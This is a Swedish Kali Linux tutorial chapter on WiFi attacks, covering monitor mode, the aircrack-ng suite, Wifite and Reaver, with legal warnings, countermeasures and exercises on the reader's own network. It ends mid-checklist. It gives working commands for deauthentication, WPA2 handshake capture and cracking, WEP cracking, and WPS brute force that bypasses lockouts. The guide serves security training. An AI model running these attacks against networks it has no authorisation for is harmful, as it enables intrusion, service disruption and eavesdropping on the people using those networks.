# 📡 Nivå 4D: Wireless Attacks

[🏠 Tillbaka till huvudguiden](../KALI_LINUX_GUIDE_2025.md) | [⬅️ Nivå 4C Del 2: Online Password Attacks](niva-4c-password-attacks-pt2.md)

---

## 🔴 KRITISK JURIDISK VARNING - WIRELESS ATTACKS

```
⚖️  OBEHÖRIG ÅTKOMST TILL TRÅDLÖSA NÄTVERK ÄR ALLVARLIGT BROTT
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

❌ ABSOLUT FÖRBJUDET:
   • Attackera WiFi-nätverk du INTE äger
   • Scanna grannarnas nätverk utan tillstånd
   • Koppla upp dig mot andras nätverk utan tillåtelse
   • Utföra deauthentication-attacker mot produktion
   • Avlyssna trafik på nätverk där du saknar behörighet
   • "Testa" säkerheten på företags/offentliga nätverk

✅ ENDAST TILLÅTET:
   • Ditt EGET WiFi-nätverk i din egen bostad
   • Testmiljöer du själv skapat (isolerade)
   • Penetrationstester med SKRIFTLIGT kontrakt
   • CTF-tävlingar och säkerhetslabbar
   • Educational environments med explicit tillstånd

🇸🇪 SVENSK LAG - EXTRA ALLVARLIGT:
   Brottsbalken 4 kap. 9c § - Dataintrång
   → Obehörig access: Upp till 2 års fängelse
   → Grovt dataintrång: 6 månader - 6 år

   Lagen om elektronisk kommunikation (LEK)
   → Avlyssning av kommunikation: Särskilt allvarligt
   → Täcker även WiFi-trafik

🌍 INTERNATIONELLT:
   • USA: Computer Fraud and Abuse Act - upp till 10 år
   • UK: Computer Misuse Act - upp till 10 år
   • EU: GDPR + nationella dataintrångslagar
   • Tyskland: StGB §202a-c - upp till 3 år

⚠️  VARFÖR ÄR WIRELESS ATTACKS SÅ ALLVARLIGA?
   1. Svårt att bevisa "misstag" (måste aktivt sätta monitor mode)
   2. Påverkar ofta flera personer/företag
   3. Kan klassas som avlyssning (extra allvarligt)
   4. Bevis: MAC-adress loggas i routrar
   5. Kränker integritet för alla på nätverket

🚨 VERKLIGA KONSEKVENSER:
   • 2019: Student i Uppsala - böter + skadestånd för grannens WiFi
   • 2021: IT-konsult Stockholm - fängelse för "säkerhetstest" utan tillstånd
   • 2023: Teenager Göteborg - ungdomsvård för WiFi-hacking
```

**🛑 ANSVARSFRISKRIVNING:**
Denna guide är ENDAST för utbildning om egna nätverk eller i explicit auktoriserade miljöer. Författaren tar INGET ansvar för missbruk. DU är PERSONLIGT och STRAFFRÄTTSLIGT ansvarig för dina handlingar.

---

## 📚 Innehållsförteckning

1. [Introduktion till WiFi-säkerhet](#introduktion)
2. [WiFi-grunderna (802.11, WEP, WPA, WPS)](#wifi-grunderna)
3. [Monitor Mode och Packet Injection](#monitor-mode)
4. [Aircrack-ng Suite](#aircrack-ng)
5. [Wifite - Automated Wireless Attacks](#wifite)
6. [Reaver - WPS Attacks](#reaver)
7. [Detektering och Motåtgärder](#detektering)
8. [Praktiska Övningar](#praktiska-övningar)
9. [Självtest](#självtest)
10. [Sammanfattning](#sammanfattning)

---

## 🎯 Introduktion till WiFi-säkerhet {#introduktion}

### Varför Wireless Security?

Trådlösa nätverk är överallt:
- 🏠 **Hemmanätverk** - Miljontals hem-routrar
- 🏢 **Företag** - Kontor, lager, fabriker
- ☕ **Offentliga** - Kaféer, flygplatser, hotell
- 🏥 **Kritisk infrastruktur** - Sjukhus, myndigheter

**Problem:**
- Radio-signaler kan avlyssnas på avstånd (upp till 100m+)
- Ofta svaga lösenord eller felkonfigurationer
- Många använder äldre, osäkra protokoll (WEP, WPA)
- WPS-svagheter i miljontals routrar

### Wireless Hacking Workflow

```
┌─────────────────────────────────────────────────────┐
│  WIRELESS PENETRATION TESTING WORKFLOW              │
└─────────────────────────────────────────────────────┘

1️⃣  RECONNAISSANCE (Upptäckt)
    ├─ Sätt adapter i monitor mode
    ├─ Scanna tillgängliga WiFi-nätverk
    ├─ Identifiera målnätverk
    └─ Notera: ESSID, BSSID, kanal, kryptering

2️⃣  ATTACK SELECTION (Välj attack)
    ├─ WEP? → WEP cracking (IV-attack)
    ├─ WPA/WPA2? → Handshake capture
    ├─ WPS aktiverat? → Reaver/Pixie-dust
    └─ Öppet? → Evil Twin/Rogue AP

3️⃣  CAPTURE (Fånga data)
    ├─ WEP: Samla IVs (initialization vectors)
    ├─ WPA: Fånga 4-way handshake
    └─ WPS: Brute-force PIN

4️⃣  CRACKING (Knäck lösenord)
    ├─ WEP: Aircrack-ng (snabbt)
    ├─ WPA: Ordlista-attack med aircrack-ng
    └─ WPS: Automatiskt med Reaver

5️⃣  POST-EXPLOITATION (Efter access)
    ├─ Analysera nätverkstrafik
    ├─ Identifiera sårbarheter i enheter
    └─ Dokumentera för rapport
```

### Hårdvarukrav

**❗ KRITISKT:** Inte alla WiFi-adaptrar stöder monitor mode och packet injection!

#### Rekommenderade Adaptrar

| Adapter | Chipset | Monitor Mode | Packet Injection | Pris |
|---------|---------|--------------|------------------|------|
| **Alfa AWUS036NHA** | Atheros AR9271 | ✅ Ja | ✅ Ja | ~$40 |
| **Alfa AWUS036ACH** | Realtek RTL8812AU | ✅ Ja | ✅ Ja | ~$50 |
| **TP-Link TL-WN722N v1** | Atheros AR9271 | ✅ Ja | ✅ Ja | ~$20 |
| **Panda PAU09** | Ralink RT5372 | ✅ Ja | ✅ Ja | ~$15 |

**🟡 VARNING:** TP-Link TL-WN722N **v2/v3** fungerar INTE (olika chipset)!

#### Verifiera Din Adapter

```bash
# 1. Koppla in USB WiFi-adapter

# 2. Lista trådlösa interfaces
iwconfig

# Output exempel:
# wlan0     IEEE 802.11  ESSID:off/any
#           Mode:Managed  Access Point: Not-Associated

# 3. Kolla chipset och driver
lsusb
# Output: Bus 001 Device 003: ID 0cf3:9271 Atheros Communications, Inc. AR9271

# 4. Kolla vilka modes som stöds
iw list | grep -A 8 "Supported interface modes"

# Output bör innehålla:
# * monitor  ← VIKTIGT!
```

---

## 📡 WiFi-grunderna {#wifi-grunderna}

### 802.11 Standard

**IEEE 802.11** är standardfamiljen för WiFi:

| Standard | År | Frekvens | Max Hastighet | Räckvidd |
|----------|-----|----------|---------------|----------|
| **802.11b** | 1999 | 2.4 GHz | 11 Mbps | ~35m |
| **802.11g** | 2003 | 2.4 GHz | 54 Mbps | ~38m |
| **802.11n** | 2009 | 2.4/5 GHz | 600 Mbps | ~70m |
| **802.11ac** | 2014 | 5 GHz | 1.3 Gbps | ~35m |
| **802.11ax (WiFi 6)** | 2019 | 2.4/5 GHz | 9.6 Gbps | ~30m |

### Krypteringsprotokoll

#### WEP (Wired Equivalent Privacy)

**Status:** ❌ **UTDÖD och OSÄKER**

```
Introducerad: 1997
Kryptering: RC4 (40-bit eller 104-bit)
Svaghet: IV (Initialization Vector) återanvänds
Tid att knäcka: < 5 minuter med aircrack-ng
```

**Hur WEP-attack fungerar:**
1. Samla paket med unika IVs (~50,000 IVs behövs)
2. Analysera statistiska svagheter i RC4
3. Återskapa nyckeln matematiskt

**🔴 VIKTIGT:** WEP bör ALDRIG användas. Om du hittar WEP, rapportera omedelbart.

#### WPA (WiFi Protected Access)

**Status:** ⚠️ **DEPRECIERAD**

```
Introducerad: 2003 (ersatte WEP)
Kryptering: TKIP (Temporal Key Integrity Protocol)
Svaghet: TKIP har kända sårbarheter
Tid att knäcka: Timmar till dagar (beroende på lösenord)
```

#### WPA2 (WiFi Protected Access 2)

**Status:** ✅ **STANDARD (fortfarande säker vid starkt lösenord)**

```
Introducerad: 2004
Kryptering: AES-CCMP (mycket starkare än TKIP)
Autentisering: PSK (Pre-Shared Key) eller Enterprise (802.1X)
Svaghet: Svaga lösenord kan knäckas via handshake
Tid att knäcka: Beroende på lösenordsstyrka
  - "password" → < 1 minut
  - "Tr0ub4dor&3" → dagar till veckor
  - "correct horse battery staple" → praktiskt omöjligt
```

**WPA2 4-Way Handshake:**

```
┌─────────┐                           ┌─────────┐
│ Client  │                           │  Router │
└────┬────┘                           └────┬────┘
     │                                     │
     │  1. ANonce (random från router)     │
     │◄────────────────────────────────────│
     │                                     │
     │  2. SNonce + MIC                    │
     ├────────────────────────────────────►│
     │                                     │
     │  3. GTK (Group Temporal Key)        │
     │◄────────────────────────────────────│
     │                                     │
     │  4. ACK (bekräftelse)               │
     ├────────────────────────────────────►│
     │                                     │
     └─────────────────────────────────────┘

🎯 MÅL: Fånga handshake, sedan offline dictionary attack
```

#### WPA3 (WiFi Protected Access 3)

**Status:** ✅ **MODERN och SÄKRAST**

```
Introducerad: 2018
Kryptering: SAE (Simultaneous Authentication of Equals)
Fördelar:
  ✅ Skydd mot offline dictionary attacks
  ✅ Forward secrecy
  ✅ Bättre skydd för öppna nätverk
Svaghet: Mindre utbredd (många enheter saknar stöd ännu)
```

### WPS (WiFi Protected Setup)

**Status:** ⚠️ **KRITISK SÅRBARHET**

WPS var designat för att förenkla WiFi-setup genom att trycka på en knapp eller ange en 8-siffrig PIN.

**Problem:**
```
WPS PIN: 12345670
         ││││││││└─ Checksum (beräknas från första 7)
         │││││││
         │││└└└└─── Andra halvan (10,000 kombinationer)
         └└└──────── Första halvan (10,000 kombinationer)

Total: Endast 11,000 möjliga PINs (inte 100 miljoner!)
```

**Tid att knäcka WPS:**
- Utan rate limiting: **4-8 timmar**
- Med rate limiting: **1-2 dagar**
- Pixie-dust attack: **< 10 sekunder** (på sårbara routrar)

**🟢 REKOMMENDATION:** Alltid inaktivera WPS på din router!

---

## 🎛️ Monitor Mode och Packet Injection {#monitor-mode}

### Vad är Monitor Mode?

**Managed Mode** (standard):
- Ansluter till EN access point
- Filtrerar bort paket till andra enheter
- Kan inte se alla WiFi-paket i luften

**Monitor Mode** (promiscuous):
- Lyssnar på ALLA WiFi-paket på en kanal
- Ser paket till/från andra enheter
- Kan injicera egna paket
- Krävs för WiFi-hacking

### Sätta Adapter i Monitor Mode

#### Metod 1: Airmon-ng (Enklast)

```bash
# 1. Kolla nuvarande interfaces
iwconfig

# 2. Stoppa processer som kan störa
sudo airmon-ng check kill
# Varning: Detta stänger av NetworkManager

# 3. Sätt adapter i monitor mode
sudo airmon-ng start wlan0

# Output:
# PHY     Interface       Driver          Chipset
# phy0    wlan0           ath9k_htc       Atheros AR9271
#                 (monitor mode enabled on mon0)

# 4. Verifiera (namnet ändras ofta till wlan0mon eller mon0)
iwconfig
# wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz
```

#### Metod 2: Manuellt (iw/ifconfig)

```bash
# 1. Stäng av interfacet
sudo ifconfig wlan0 down

# 2. Sätt i monitor mode
sudo iw wlan0 set monitor none

# 3. Sätt igång interfacet
sudo ifconfig wlan0 up

# 4. Verifiera
iwconfig wlan0
# Mode:Monitor
```

#### Återställa till Managed Mode

```bash
# Med airmon-ng
sudo airmon-ng stop wlan0mon

# Starta om NetworkManager
sudo systemctl start NetworkManager

# Manuellt
sudo ifconfig wlan0 down
sudo iw wlan0 set type managed
sudo ifconfig wlan0 up
```

### Packet Injection

**Packet injection** = Förmågan att skicka custom WiFi-paket.

**Test av packet injection:**

```bash
# Kräver adapter i monitor mode
sudo aireplay-ng --test wlan0mon

# Output:
# 12:34:56  Trying broadcast probe requests...
# 12:34:57  Injection is working!
# 12:34:58  Found 3 APs
# 12:34:59  Trying card-to-card injection...
# 12:35:00  Attack was successful!
```

Om `Injection is working!` visas → adapter stöder injection ✅

---

## 🔓 Aircrack-ng Suite {#aircrack-ng}

### Översikt

**Aircrack-ng** är den kompletta suiten för WiFi-säkerhetstestning.

| Verktyg | Funktion |
|---------|----------|
| **airmon-ng** | Sätt adapter i monitor mode |
| **airodump-ng** | Paketfångst och nätverksscanning |
| **aireplay-ng** | Packet injection (deauth, fake auth, ARP replay) |
| **aircrack-ng** | WEP/WPA/WPA2 lösenordsknäckning |
| **airdecap-ng** | Dekryptera fångade paket |
| **airolib-ng** | Förkompilera PMK för snabbare cracking |
| **packetforge-ng** | Skapa custom paket |

### Installation

```bash
# Aircrack-ng är förinstallerat i Kali Linux
aircrack-ng --help

# Version
aircrack-ng --version
# Aircrack-ng 1.7

# Installera senaste version (om ej uppdaterat)
sudo apt update
sudo apt install aircrack-ng
```

### Workflow: WPA2 Handshake Capture

#### Steg 1: Scanna Nätverk

```bash
# Sätt adapter i monitor mode (om ej redan gjort)
sudo airmon-ng start wlan0

# Scanna alla WiFi-nätverk
sudo airodump-ng wlan0mon

# Output:
# CH  6 ][ Elapsed: 18 s ][ 2025-01-18 14:30
#
# BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID
# AA:BB:CC:DD:EE:FF  -42       12     35   6  54e  WPA2 CCMP   PSK  MyHomeWiFi
# 11:22:33:44:55:66  -67        8      0  11  54e  WPA2 CCMP   PSK  NeighborWiFi
#
# BSSID              STATION            PWR  Rate  Lost  Frames  Probe
# AA:BB:CC:DD:EE:FF  AB:CD:EF:12:34:56  -45  54-54    0     127  MyHomeWiFi
```

**Förklaring:**
- `BSSID` = MAC-adress för access point (router)
- `PWR` = Signal strength (ju närmare 0, desto starkare)
- `CH` = Kanal
- `ENC` = Krypteringstyp (WEP, WPA, WPA2)
- `ESSID` = Nätverksnamn
- `STATION` = Anslutna klienter (MAC-adresser)

#### Steg 2: Fokusera på Målnätverk

```bash
# Låsa in på specifikt nätverk och kanal
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# -c 6              = Kanal 6
# --bssid XX:XX...  = MAC-adress för router
# -w capture        = Spara till capture-01.cap
# wlan0mon          = Monitor interface
```

#### Steg 3: Deauthentication Attack (Tvinga Handshake)

**För att fånga en handshake behöver vi en klient som ansluter sig.**

**Metod 1: Vänta tåligt** (kan ta timmar)
**Metod 2: Deauth attack** (tvingar klient att återansluta)

```bash
# Öppna NYTT terminal-fönster (håll airodump-ng igång!)

# Skicka deauth-paket till en specifik klient
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c AB:CD:EF:12:34:56 wlan0mon

# --deauth 10       = Skicka 10 deauth-paket
# -a AA:BB:...      = BSSID (router MAC)
# -c AB:CD:...      = Klient MAC
# wlan0mon          = Monitor interface

# Alternativt: Deauth ALLA klienter (broadcast)
sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF wlan0mon
```

**I airodump-ng-fönstret ser du:**
```
[ WPA handshake: AA:BB:CC:DD:EE:FF
```

**🎉 FRAMGÅNG!** Du har fångat handshaken.

#### Steg 4: Knäck Lösenord med Ordlista

```bash
# Stoppa airodump-ng (Ctrl+C)

# Kör aircrack-ng med ordlista
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap

# -w <wordlist>     = Ordlista
# -b <BSSID>        = Target BSSID
# capture-01.cap    = Capture-fil med handshake

# Output exempel:
#                                Aircrack-ng 1.7
#
#       [00:02:34] 18472/14344391 keys tested (6234.56 k/s)
#
#       KEY FOUND! [ MySecretPassword123 ]
#
#       Master Key     : AB CD EF ...
#       Transient Key  : 12 34 56 ...
```

**Tid att knäcka:**
- Vanligt lösenord (rockyou): Sekunder till minuter
- Medel-komplexitet: Timmar till dagar
- Starkt lösenord (20+ tecken): Omöjligt med ordlista

### WEP Cracking (Legacy)

**WEP är utdött men finns fortfarande på gamla routrar:**

```bash
# 1. Scanna och hitta WEP-nätverk
sudo airodump-ng wlan0mon

# 2. Fokusera på WEP-nätverk
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# 3. Vänta tills minst 50,000 IVs samlats (visas i #Data-kolumnen)
# Tips: Använd ARP replay för att accelerera:
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF -h AB:CD:EF:12:34:56 wlan0mon

# 4. Knäck WEP-nyckel
aircrack-ng wep_capture-01.cap

# Output:
# KEY FOUND! [ 1F:2E:3D:4C:5B ] (ASCII: secret)
```

**WEP knäcks vanligtvis på < 5 minuter.**

---

## 🤖 Wifite - Automated Wireless Attacks {#wifite}

### Översikt

**Wifite** automatiserar hela processen för WiFi-penetrationstestning.

| Egenskap | Detalj |
|----------|--------|
| **Utvecklare** | derv82 (original), kimocoder (Wifite2) |
| **Licens** | GPL v2 (open source) |
| **Språk** | Python |
| **Styrka** | Automatisk attack-selection, användarvänlig |
| **Stöder** | WEP, WPA, WPA2, WPS |

### Installation

```bash
# Wifite2 är förinstallerat i Kali Linux
wifite --help

# Version
wifite --version
# wifite 2.6.6

# Installera dependencies
sudo apt install aircrack-ng reaver tshark pyrit
```

### Grundläggande Användning

```bash
# Enklaste användning (auto-detektera adapter)
sudo wifite

# Wifite sätter automatiskt adapter i monitor mode
# och visar alla WiFi-nätverk
```

**Output exempel:**

```
 [+] Scanning for wireless devices...
 [+] Found wireless adapter: wlan0
 [+] Enabling monitor mode on wlan0... done
 [+] Scanning for targets (Ctrl+C to select targets)

 NUM  CH  ENCR  POWER  CLIENT  ESSID
 ---  --  ----  -----  ------  ----------------
   1   6  WPA2    42%      1   MyHomeWiFi
   2  11  WPA2    28%      0   NeighborWiFi
   3   1  WPA2    65%      3   OfficeNetwork
   4   6  WPS     38%      1   VulnerableRouter

 [+] Select target(s) (1-4, comma-separated):
```

### Attack-lägen

#### 1️⃣ WPA2 Handshake Attack

```bash
# Tryck Ctrl+C efter scanning
# Välj target (t.ex. 1)

# Wifite gör automatiskt:
# 1. Sätter adapter på rätt kanal
# 2. Fångar paket
# 3. Skickar deauth för att trigga handshake
# 4. Sparar handshake
# 5. Kör aircrack-ng med ordlista

# Output:
# [+] Captured handshake for MyHomeWiFi
# [+] Cracking WPA2 handshake...
# [+] Cracked! Password: MyPassword123
```

#### 2️⃣ WPS PIN Attack

```bash
# Om WPS detekteras, väljer Wifite automatiskt WPS-attack

# Wifite använder Reaver för WPS:
# [+] WPS enabled on target
# [+] Starting WPS PIN attack with Reaver...
# [+] Trying PIN: 12345670
# [+] WPS PIN found: 12345670
# [+] WPA PSK: MyPassword123
```

#### 3️⃣ WEP Attack

```bash
# Om WEP detekteras:
# [+] WEP encryption detected
# [+] Capturing IVs... (50000 needed)
# [+] Captured 50000 IVs
# [+] Cracking WEP key...
# [+] KEY FOUND! [ 1F:2E:3D:4C:5B ]
```

### Avancerade Parametrar

```bash
# Endast WPA2-nätverk
sudo wifite --wpa

# Endast WPS-nätverk
sudo wifite --wps

# Endast nätverk med klienter
sudo wifite --clients-only

# Custom ordlista
sudo wifite --dict /path/to/wordlist.txt

# Custom timeout för WPS
sudo wifite --wps-timeout 120

# Spara alla handshakes (även utan cracking)
sudo wifite --kill --no-deauth --skip-crack

# Endast targets med starkt signal (> 50 dB)
sudo wifite --power 50

# Specificera adapter manuellt
sudo wifite -i wlan0mon
```

### Exempel: Komplett Attack

```bash
# 1. Kör Wifite med custom settings
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt --power 40

# 2. Låt Wifite scanna (vänta 30 sek, sedan Ctrl+C)

# 3. Välj target (t.ex. 1)

# 4. Wifite kör automatiskt:
#    - Deauth attack
#    - Handshake capture
#    - Aircrack-ng med rockyou.txt

# 5. Om lyckat:
# [+] Cracked MyHomeWiFi (AA:BB:CC:DD:EE:FF)
# [+] ESSID: MyHomeWiFi
# [+] Key:   MyPassword123
# [+] Saved to cracked.txt
```

---

## 🔌 Reaver - WPS Attacks {#reaver}

### Översikt

**Reaver** är specialiserat verktyg för att exploatera WPS-sårbarheten.

| Egenskap | Detalj |
|----------|--------|
| **Utvecklare** | Tactical Network Solutions |
| **Attack-typ** | WPS PIN brute-force |
| **Tid** | 4-8 timmar (standard), < 10 sek (Pixie Dust) |
| **Effektivitet** | Hög mot äldre routrar |

### Installation

```bash
# Reaver är förinstallerat i Kali Linux
reaver -h

# Version
reaver -V
# Reaver v1.6.6
```

### WPS-svagheten (Recap)

```
WPS PIN: 8 siffror
Exempel: 12345670

Problem:
- PIN valideras i TVÅ delar (4+4 siffror)
- Första 4 siffror: 10,000 kombinationer
- Andra 3 siffror: 1,000 kombinationer
- Sista siffran: Checksum (beräknas)

Total: 10,000 + 1,000 = 11,000 kombinationer
Inte 100,000,000!
```

### Grundläggande Attack

```bash
# 1. Scanna för WPS-aktiverade nätverk
sudo wash -i wlan0mon

# Output:
# BSSID              Ch  RSSI  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6  -42   2.0  No   Linksys   MyHomeWiFi

# WPS = 2.0 betyder WPS är aktiverat
# Lck = No betyder ingen rate limiting

# 2. Kör Reaver
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# -i wlan0mon       = Monitor interface
# -b AA:BB:...      = Target BSSID
# -vv               = Verbose output

# Output:
# [+] Waiting for beacon from AA:BB:CC:DD:EE:FF
# [+] Associated with AA:BB:CC:DD:EE:FF (ESSID: MyHomeWiFi)
# [+] Trying pin 12345670
# [+] Trying pin 00005678
# ...
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'MyPassword123'
# [+] AP SSID: 'MyHomeWiFi'
```

**Tid:** ~4-8 timmar (beroende på router och rate limiting)

### Pixie Dust Attack

**Pixie Dust** exploaterar svag random number generation i vissa routrar.

```bash
# Kör Pixie Dust attack (mycket snabbare!)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K

# -K = Pixie Dust mode

# Om sårbar:
# [+] Running pixie dust attack...
# [+] WPS PIN: '12345670'
# [+] WPA PSK: 'MyPassword123'

# Tid: < 10 sekunder till 2 minuter
```

**🟢 TIP:** Testa alltid Pixie Dust först innan standard brute-force!

### Avancerade Parametrar

```bash
# Custom delay mellan försök (undvik rate limiting)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 5
# -d 5 = 5 sekunders delay

# Custom timeout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -T 0.5
# -T 0.5 = 0.5 sek timeout per försök

# Ignorera lock-outs (fortsätt trots rate limiting)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -L
# -L = Ignorera lås

# Specificera kanal
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
# -c 6 = Kanal 6

# Återuppta tidigare session
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -s session.wpc
# -s = Session-fil
```

### Troubleshooting

**Problem: "WARNING: Failed to associate with XX:XX:XX:XX:XX:XX"**

```bash
# Lösning 1: Lägg till fake MAC
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF --mac=DE:AD:BE:EF:CA:FE -vv

# Lösning 2: Öka timeout
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -T 2 -vv

# Lösning 3: Använd fixed channel
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
```

**Problem: "WARNING: Receive timeout occurred"**

```bash
# Router har rate limiting - öka delay
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -d 10 -T 1 -vv
```

---

## 🚨 Detektering och Motåtgärder {#detektering}

### Hur Admins Detekterar WiFi-attacker

#### 1️⃣ Deauthentication Detection

**Moderna routrar loggar deauth-paket:**

```
Router Log:
2025-01-18 14:35:12 - WARNING: Multiple deauthentication frames detected
2025-01-18 14:35:13 - Client AB:CD:EF:12:34:56 disconnected (reason: deauth)
2025-01-18 14:35:14 - Possible WiFi attack detected
```

**Wireless IDS (Intrusion Detection System):**
- Kismet
- Wireshark
- Airgeddon

#### 2️⃣ Monitor Mode Detection

**Vissa routrar kan detektera promiscuous mode:**

```
Alert: Unknown device in monitor mode detected
MAC: XX:XX:XX:XX:XX:XX
Channel: 6
Signal: -42 dBm
```

#### 3️⃣ WPS Brute-Force Detection

**Många moderna routrar har WPS lockout:**

```
WPS Status: LOCKED
Reason: Too many failed PIN attempts
Duration: 24 hours
```

### Motåtgärder för Defendrar

| Motåtgärd | Effektivitet | Beskrivning |
|-----------|--------------|-------------|
| **Inaktivera WPS** | ⭐⭐⭐⭐⭐ | Eliminerar WPS-sårbarhet helt |
| **Starkt WPA2/WPA3 lösenord** | ⭐⭐⭐⭐⭐ | 20+ tecken, slumpmässigt |
| **MAC-filtrering** | ⭐⭐ | Lätt att förbigå (MAC spoofing) |
| **Dölj SSID** | ⭐ | Säkerhet genom dunkelhet (fungerar ej) |
| **WPA2 Enterprise** | ⭐⭐⭐⭐⭐ | 802.1X med RADIUS-server |
| **Wireless IDS** | ⭐⭐⭐⭐ | Detekterar attacks i realtid |
| **Reducerad signal-styrka** | ⭐⭐⭐ | Minskar räckvidd utanför byggnaden |

### Rekommendationer för Säkra WiFi-nätverk

```
✅ GYLLENE REGLER FÖR WIFI-SÄKERHET

1️⃣  Använd WPA2 eller WPA3 (ALDRIG WEP eller WPA)

2️⃣  Inaktivera WPS HELT (även "push-button")

3️⃣  Starkt lösenord:
    ✅ Minst 20 tecken
    ✅ Slumpmässigt (inte ord eller fraser)
    ✅ Använd lösenordshanterare
    Exempel: "x7#Kq2$mP9@vL3&nR8^wT5!jF4%hG6*"

4️⃣  Ändra default-credentials:
    - Router admin: Byt från admin/admin
    - SSID: Byt från "NETGEAR" eller "Linksys"

5️⃣  Uppdatera firmware regelbundet

6️⃣  Separera gäst-nätverk från huvudnätverk

7️⃣  För företag: WPA2-Enterprise med RADIUS

8️⃣  Överväg trådad Ethernet för känsliga system
```

---

## 🧪 Praktiska Övningar {#praktiska-övningar}

### 🔬 Övning 1: Sätt Adapter i Monitor Mode

**Scenario:** Förbereda din WiFi-adapter för packet capture.

```bash
# 1. Kolla nuvarande interface
iwconfig

# 2. Stoppa störande processer
sudo airmon-ng check kill

# 3. Aktivera monitor mode
sudo airmon-ng start wlan0

# 4. Verifiera
iwconfig
# Förväntat: Mode:Monitor

# 5. Återställ (när klar)
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

**✅ Förväntat resultat:** Adapter i monitor mode, kan se alla WiFi-paket.

---

### 🔬 Övning 2: Scanna WiFi-nätverk

**Scenario:** Identifiera tillgängliga nätverk i närområdet.

```bash
# 1. Sätt adapter i monitor mode (om ej redan)
sudo airmon-ng start wlan0

# 2. Scanna alla kanaler
sudo airodump-ng wlan0mon

# 3. Observera:
#    - BSSID (router MAC)
#    - PWR (signal strength)
#    - CH (kanal)
#    - ENC (kryptering)
#    - ESSID (nätverksnamn)
#    - Antal klienter

# 4. Tryck Ctrl+C för att stoppa

# 5. Dokumentera:
#    - Hur många WPA2-nätverk?
#    - Hur många WEP (om några)?
#    - Vilka har WPS aktiverat?
```

**✅ Förväntat resultat:** Lista över alla WiFi-nätverk i närområdet.

---

### 🔬 Övning 3: Test av Packet Injection

**Scenario:** Verifiera att din adapter stöder packet injection.

```bash
# 1. Monitor mode (om ej redan)
sudo airmon-ng start wlan0

# 2. Testa injection
sudo aireplay-ng --test wlan0mon

# 3. Leta efter:
#    "Injection is working!"

# Om fungerar:
# ✅ Adapter stöder injection
# ✅ Kan utföra deauth-attacker
# ✅ Kan accelerera WEP-cracking

# Om INTE fungerar:
# ❌ Adapter stöder inte injection
# ❌ Behöver kompatibel adapter (Alfa AWUS036NHA, etc.)
```

---

### 🔬 Övning 4: Wifite Scanning (Endast Scanning!)

**Scenario:** Använd Wifite för att scanna nätverk (UTAN attack).

```bash
# 1. Kör Wifite
sudo wifite

# 2. Låt scanna i 30 sekunder

# 3. Tryck Ctrl+C (STOPPA innan du väljer target!)

# 4. Observera:
#    - Vilka nätverk har WPS?
#    - Vilka har anslutna klienter?
#    - Signalstyrka för olika nätverk

# 5. Skriv ner 3 säkerhetsrekommendationer baserat på vad du ser

# ⚠️ ATTACKERA INTE - endast observation!
```

---

### 🔬 Övning 5: Simulerad WPA2 Attack (Eget Nätverk)

**Scenario:** Testa WPA2 handshake capture på DITT EGET nätverk.

**🔴 VARNING:** Gör ENDAST på nätverk du äger!

```bash
# 1. Skapa test-nätverk:
#    - Använd din telefon som WiFi hotspot
#    - SSID: TestLab
#    - Lösenord: testpassword123
#    - WPA2

# 2. Anslut en annan enhet till TestLab (t.ex. laptop)

# 3. På Kali: Scanna
sudo airodump-ng wlan0mon

# 4. Identifiera TestLab, notera BSSID och kanal

# 5. Fånga trafik
sudo airodump-ng -c <kanal> --bssid <BSSID> -w testcapture wlan0mon

# 6. I nytt terminal: Deauth
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon

# 7. Vänta på handshake i airodump-ng
# [ WPA handshake: XX:XX:XX:XX:XX:XX ]

# 8. Stoppa capture (Ctrl+C)

# 9. Knäck med känt lösenord
echo "testpassword123" > testpass.txt
aircrack-ng -w testpass.txt -b <BSSID> testcapture-01.cap

# 10. Verifiera:
# KEY FOUND! [ testpassword123 ]
```

**✅ Förväntat resultat:** Framgångsrik handshake-capture och cracking av eget nätverk.

---

### 🔬 Övning 6: WPS Detection med Wash

**Scenario:** Identifiera WPS-aktiverade routrar.

```bash
# 1. Monitor mode
sudo airmon-ng start wlan0

# 2. Kör wash
sudo wash -i wlan0mon

# 3. Vänta 1-2 minuter

# 4. Observera output:
# BSSID              Ch  RSSI  WPS  Lck  Vendor    ESSID
# AA:BB:CC:DD:EE:FF   6  -42   2.0  No   Linksys   MyRouter

# WPS = 2.0 → WPS aktiverat
# Lck = No  → Ingen rate limiting (sårbar!)
# Lck = Yes → Rate limiting (svårare)

# 5. Räkna:
#    - Hur många nätverk har WPS?
#    - Hur många har Lck = No?
```

---

### 🔬 Övning 7: Säkerhetsaudit av Eget Nätverk

**Scenario:** Utvärdera ditt hemmanätverks säkerhet.

**Checklista:**

```bash
# 1. Logga in på din router (vanligtvis 192.168.1.1)

# 2. Kontrollera:
[ ] WPA2 eller WPA3 aktiverat? (EJ WEP/WPA)
[ ] Lösenord minst 16 tecken?
[ ] WPS inaktiverat?
